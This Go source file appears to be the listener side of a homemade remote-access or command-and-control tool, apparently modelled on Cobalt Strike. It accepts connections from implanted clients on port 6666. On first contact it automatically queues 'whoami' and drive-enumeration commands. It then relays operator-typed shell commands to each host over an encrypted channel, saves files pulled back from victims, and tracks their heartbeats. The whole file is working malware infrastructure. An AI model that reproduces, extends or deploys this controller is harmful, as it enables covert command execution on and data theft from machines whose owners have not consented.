package cobalt_tcp

import (
	cobalt_crypto "My-Comment/cobalt.crypto"
	cobalt_file "My-Comment/cobalt.file"
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"regexp"
	"runtime"
	"strings"
	"time"
)

var DEBUG bool = false
var OPENIP bool = true //是否只按照ip地址区分客户端

var Computer = runtime.GOOS //
var MaxConnect = 30         // 定义最大连接数量
var MaxChanSize = 10        //默认每个命令通道的大小
var MaxMagString = 50000    //默认每次接受命令的大小

type TimeInfo struct {
	TimeString string
	Living     chan bool
	flags      bool
	Time       time.Time
}
type HOSTS struct {
	Ip            string
	Chans         chan string
	Time          TimeInfo
	Living        string
	ChansFileName chan string
	Whoami        string
	Disk          []string
	File          string
	ChansTime     chan string
}

var IpChanMap = make(map[int]HOSTS, MaxConnect)

func MyListen() (net.Listener, error) {
	return net.Listen("tcp", ":6666")
}
func (hosts *HOSTS) UseCmd(id int) {
	var b string
	reader := bufio.NewReader(os.Stdin) // 确保得到空行

	fmt.Printf("使用quit退出\n")
	if Computer == "windows" {
		_, _ = fmt.Scanf("%s", &b)
	}

	for {
		fmt.Printf(">")
		a, _ := reader.ReadString('\n')
		if strings.Index(a, "quit") == 0 {
			break
		}
		if DEBUG {
			fmt.Printf("user cmd :%s\n", a)
		}

		hosts.Chans <- "Cmd\r\n" + a
		go Times(800, id)
		<-IpChanMap[id].ChansTime
	}
}
func Times(t int, id int) {
	time.Sleep(time.Millisecond * time.Duration(t))
	IpChanMap[id].ChansTime <- "ok"
	if DEBUG {
		fmt.Printf("Times over\n")
	}
}
func (hosts *HOSTS) SetCmd(string2 string) {
	cmd := "Cmd\r\n" + string2
	hosts.Chans <- cmd
	//backs := <-hosts.chansBack
	fmt.Printf("\n")
	//fmt.Printf("%s", backs)
}

func (_ HOSTS) Listener(listener net.Listener) {

	for {

		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}
		// 检测地址是否被保存过
		// 检测该端口是否存在过，如果不存在，就标记并传入通道，反之就创建通道，记录并传入
		ip := conn.RemoteAddr().String()
		if OPENIP {
			reg := regexp.MustCompile(`\d*\.\d*\.\d*\.\d`)
			ip = reg.FindString(ip)
		}
		_, cmd := addIp(ip)
		//_ = conn.SetReadDeadline(Time.Time{}.Add(Time.Second * 60))
		//ipchan[i] = *cmd
		go PutMsgs(conn, cmd) //复制传输，所以传输后conn的值改变也无妨
		if DEBUG {
			fmt.Printf("启动传输协程完成")
		}

	}
}

func PutMsgs(conn net.Conn, cmd int) {
	// 用于向客户端发送请求的函数
	regstringCmd := "\\ACmd\\r\\n"
	regCmd := regexp.MustCompile(regstringCmd)
	regstring := "\\ADocument"
	reg := regexp.MustCompile(regstring)
	go GetMsg(conn, cmd) //启动接受消息协程
	if DEBUG {
		fmt.Printf("启动接受协程完成")
	}
	for {
		Sends := ""
		Sends = <-IpChanMap[cmd].Chans

		if regCmd.FindString(Sends) == "Cmd\r\n" {
			//defer conn.Close()
			if DEBUG {
				fmt.Printf("Cmd ： %s\n", Sends)
			}
			cobalt_file.MemUser([]byte(Sends))
			b, err1 := cobalt_crypto.EncodeString(Sends)
			cobalt_file.PutErr(err1, "cmd加密失败\n")
			if DEBUG {
				fmt.Printf("cmd加密内容：%s", b)
			}
			//a := base64.StdEncoding.EncodeToString([]byte(b))
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}
			//LivingCharge(cmd) //改变时间
			temp := IpChanMap[cmd]
			temp.Time.TimeString = time.Now().Format("01-02 15:04:05")
			temp.Time.Time = time.Now()
			IpChanMap[cmd] = temp
		} else if reg.FindString(Sends) == "Document" {
			cobalt_file.MemUser([]byte(Sends))
			if DEBUG {
				fmt.Printf("原文：%s\n", Sends)
			}
			file := Sends[8:]
			if DEBUG {
				fmt.Printf("发送内容（未加密）：%s\n", file)
			}
			b, err1 := cobalt_crypto.EncodeByte([]byte(file))
			cobalt_file.PutErr(err1, "document加密失败")
			//a := base64.StdEncoding.EncodeToString(b)
			n1, err := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("加密内容%s\n", b)
			}
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err != nil {
				// 信息发送失败报错位置S
				fmt.Printf("发送信息错误2\n")
				log.Println(err)
				if DEBUG {
					fmt.Printf("发送服务协程退出")
				}
				return
			}
			//LivingCharge(cmd)
			temp := IpChanMap[cmd]
			temp.Time.TimeString = time.Now().Format("01-02 15:04:05")
			IpChanMap[cmd] = temp

		} else {
			if DEBUG {
				fmt.Printf("其他指令类型 ： %s\n", Sends)
			}
			cobalt_file.MemUser([]byte(Sends))
			b, err1 := cobalt_crypto.EncodeByte([]byte(Sends))

			cobalt_file.PutErr(err1, "其他指令加密失败\n")
			//a := base64.StdEncoding.EncodeToString(b)
			n1, err2 := conn.Write([]byte(b)) //写入数据
			if DEBUG {
				fmt.Printf("put num = %d\n", n1)
			}
			if err2 != nil {
				fmt.Printf("写入失败，退出协程")
				log.Println(err2)
				return
			}
		}
	}

}

func addIp(ip string) (*HOSTS, int) {
	var host *HOSTS
	i := 1
	lens := len(IpChanMap) + 1
	for i < lens {

		if IpChanMap[i].Ip == ip {
			hostTme := IpChanMap[i]
			host = &hostTme
			return host, i
		}
		i++
	}

	if i == lens {
		Chans := make(chan string, MaxChanSize)
		chansBack := make(chan string, MaxChanSize)
		chansBack2 := make(chan string)
		Time1 := make(chan bool)
		Chans <- "Cmd\r\nwhoami"
		Chans <- "DocumentDisk\r\n"
		var Time = TimeInfo{
			time.Now().Format("01-02 15:04:05"),
			Time1,
			false,
			time.Now(),
		}
		temp_host := HOSTS{
			ip,
			Chans,
			Time,
			"60s",
			chansBack,
			"",
			make([]string, 1),
			"default",
			chansBack2,
		}
		IpChanMap[i] = temp_host
		//hostTme := ipChanMap[i]
		host = &temp_host
	}

	return host, i

}

func (hosts HOSTS) PrintHost(i int) {
	fmt.Printf("%d\t%s\t%s\t\t%s\t %s\n", i+1, hosts.Ip, hosts.Time.TimeString,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
}

func GetMsg(conn net.Conn, hosts int) {
	var GetMsgs = make([]byte, 16*MaxMagString)
	var Messages []byte
	n, err := conn.Read(GetMsgs)
	if DEBUG && n > 1 {
		fmt.Printf("未处理的原始信息:%s\n%d", GetMsgs, n)
	}
	//GetMsgs, _ = base64.StdEncoding.DecodeString(string(GetMsgs))

	cobalt_file.PutErr(err, "接受whoami错误3\n")
	//需要提出尾部字符
	temp1, _ := cobalt_crypto.DecodeToString(GetMsgs[:n])
	strings.Replace(temp1, "\\n", "", -1)
	if DEBUG {
		fmt.Printf("打印接受的whoami：%s\n", temp1)

	}
	// 解码位置

	host1 := IpChanMap[hosts]
	fmt.Printf("新的主机：%s\n", temp1)
	host1.Whoami = temp1
	IpChanMap[hosts] = host1
	//hosts.chansBack <- hosts.Whoami
	if DEBUG {
		fmt.Printf("打印赋值的whoami: %s\n", IpChanMap[hosts].Whoami)
	}
	if DEBUG {
		fmt.Printf("whoami: %s\n", GetMsgs)
	}
	//var err2 error
	// 开始信息整合处理
	for {

		n1, err1 := conn.Read(GetMsgs)
		if DEBUG && n1 > 1 {
			fmt.Printf("未处理的原始信息2:%s\n%d", GetMsgs, n1)
		}
		//GetMsgs, err1 = base64.StdEncoding.DecodeString(string(GetMsgs))
		if err1 != nil || n1 == 0 {
			//fmt.Println(err1)
			if err1 != nil {
				if DEBUG {
					log.Println(err1)
				}

			}

			continue
		}

		//if DEBUG {
		//	fmt.Printf("原始消息：%s\n", GetMsgs[:n1])
		//}
		//GetMsgs, err2 = cobalt_crypto.DecodeToByte(GetMsgs[:n1])
		GetMsgs = GetMsgs[:n1]

		Messages = bytes.Join([][]byte{Messages, GetMsgs}, []byte("")) // 连接起来
		//if DEBUG {
		//	fmt.Printf("连接后的消息 %s\n", Messages)
		//}
		for {
			if bytes.Index(Messages, []byte("!@#$^&*()_+")) != -1 {
				//取出切片
				num := bytes.Index(Messages, []byte("!@#$^&*()_+"))
				if DEBUG {
					fmt.Printf("坐标位置%d\n", num)
				}
				//开始解密
				putmsg, err3 := cobalt_crypto.DecodeToString(Messages[:num])
				cobalt_file.PutErr(err3, "解密字符失败\n")
				putmsgByte, err4 := cobalt_crypto.DecodeToByte(Messages[:num])
				cobalt_file.PutErr(err4, "解密符号失败\n")
				//putmsgByte := Messages[:num]
				if DEBUG {
					fmt.Printf("被分拣出来的内容\n")
					fmt.Println(putmsg)
				}
				Messages = append(Messages[:0], Messages[num+11:]...)
				if DEBUG {
					fmt.Printf("分拣后的缓存%s\n", Messages)
				}
				//putmsg = putmsg[1:]
				go DealMags(putmsg, hosts, putmsgByte)
				continue
				//把切片传入
			} else {
				if DEBUG {
					fmt.Printf("截断\n")
				}
				break
			}
		}
		//GetMsgs = []byte("")
	}

}

func DealMags(GetMsgs string, hosts int, orgin []byte) {
	regstring := "Document\\r\\n"
	regAlive := "Alive\\r\\n"
	regDiskString := "Disk\\r\\n"
	//regs := "#EnD#"
	//regEnd := regexp.MustCompile(regs)
	//regjin := regexp.MustCompile("###")
	regA := regexp.MustCompile(regAlive)
	reg := regexp.MustCompile(regstring)
	regDisk := regexp.MustCompile(regDiskString)
	//GetMsgs = GetMsgs[1:]
	if DEBUG {
		fmt.Printf("传入内容：%s\n", GetMsgs)
	}
	if regA.FindString(GetMsgs) == "Alive\r\n" {

		if DEBUG {
			fmt.Printf("收到心跳包")
		}
		//LivingCharge(hosts)
		temp := IpChanMap[hosts]
		temp.Time.TimeString = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp
	} else if reg.FindString(GetMsgs) == "Document\r\n" {
		num := strings.Index(GetMsgs, "Document")
		//reg.ReplaceAllString(GetMsgs, "${1}")
		file := orgin[num+10:]
		filename := <-IpChanMap[hosts].ChansFileName
		if filename == "" {
			filename = IpChanMap[hosts].File
		}
		if DEBUG {
			fmt.Printf("当前文件名称：%s\n", filename)
		}
		//i := 1
		if DEBUG {
			fmt.Printf("打印文件内容\n")
			fmt.Printf("%s\n", file)
		}
		files, err5 := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0664) //二次打开使用
		write := bufio.NewWriter(files)
		cobalt_file.PutErr(err5, "文件打开失败\n")
		_, err2 := write.Write(file)
		cobalt_file.PutErr(err2, "写入文件失败\n")
		err3 := write.Flush()
		cobalt_file.PutErr(err3, "缓冲写入文件失败\n")
		fmt.Printf("文件保存完成\n")
		err4 := files.Close()
		cobalt_file.PutErr(err4, "")
	} else if regDisk.FindString(GetMsgs) == "Disk\r\n" {
		var disknum int
		//GetMsgs = strings.Replace(GetMsgs, " ", "", 1)
		GetMsgs = strings.Trim(GetMsgs, "")
		GetMsgs = strings.Replace(GetMsgs, "\r\n", " ", -1)
		if DEBUG {
			fmt.Printf("替换后：%s\n", GetMsgs)
		}
		n, _ := fmt.Sscanf(GetMsgs, "Disk %d\n", &disknum)
		if n != 1 {
			fmt.Printf("Disk接收失败")
			if DEBUG {
				fmt.Printf("n = %d\n", n)
			}
			//log.Println(err)
		}
		temp := IpChanMap[hosts] //确保只增加1次
		capt := cap(temp.Disk) == 1
		for i := 1; i <= 10; i++ {
			if ((disknum >> i) & 1) == 1 {
				if DEBUG {
					fmt.Printf("当前盘符cap ：%d 盘符len：%d", cap(temp.Disk), len(temp.Disk))
				}
				if capt {
					if DEBUG {
						fmt.Printf("成功编辑盘符\n")
					}
					temp.Disk = append(temp.Disk, string(65+i))
				}
				if DEBUG {
					fmt.Printf("GET_存在盘符%s:\n", string(65+i))
				}

			}
		}
		//temp := IpChanMap[id]
		// 判断是否有协程正在运行

		//if temp.Time.flags { // 如果有协程
		//	temp.Time.Living <- true // 有心跳，停止
		//}
		////新的协程
		//temp.Time.Time = time.Now()           //设置新时间
		//temp.Time.LivingOrNot(temp.Ip, hosts) //启动协程

		temp.Time.TimeString = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp

	} else {
		if DEBUG {
			fmt.Printf("收到消息\n")
		}
		fmt.Printf("%s", GetMsgs)

		if DEBUG {
			fmt.Printf("当前心跳：%s\n", IpChanMap[hosts].Time)
		}

		if DEBUG {
			//fmt.Printf("data 打印完毕")
		}
		//LivingCharge(hosts)
		temp := IpChanMap[hosts]
		temp.Time.TimeString = time.Now().Format("01-02 15:04:05")
		IpChanMap[hosts] = temp
	}

}

func DebugSwitch(msg bool) {
	DEBUG = msg
	cobalt_crypto.CryphoDebug(msg)

}
func OpenIpSwitch(msg bool) {
	OPENIP = msg
}
func SwicheSet(msg int) {
	if msg == 1 { //进入Debug设置
		if DEBUG {
			DebugSwitch(false)
		} else {
			DebugSwitch(true)
		}

	} else if msg == 1 {
		if OPENIP {
			OpenIpSwitch(false)
		} else {
			OpenIpSwitch(true)
		}
	}
}
func LivingCharge(id int) {
	fmt.Println(id)
	var temp = IpChanMap[id]
	//runtime.KeepAlive(temp)
	//temp := IpChanMap[id]
	// 判断是否有协程正在运行
	if temp.Time.flags { // 如果有协程
		temp.Time.Living <- true // 有心跳，停止
	}
	//新的协程
	temp.Time.Time = time.Now()        //设置新时间
	temp.Time.LivingOrNot(temp.Ip, id) //启动协程
	temp.Time.flags = true
	IpChanMap[id] = temp //重新赋值

}
func (i TimeInfo) LivingOrNot(ip string, id int) { //检测函数
	for {
		if <-i.Living { //如果收到了心跳，就是真
			return
		}
		d := time.Now().Sub(i.Time)
		if d >= 60 {
			fmt.Printf("%s未在规定时间通信，疑似下线\n", ip)
			temp := IpChanMap[id]
			temp.Time.flags = false
			IpChanMap[id] = temp
			return
		}
	}
}
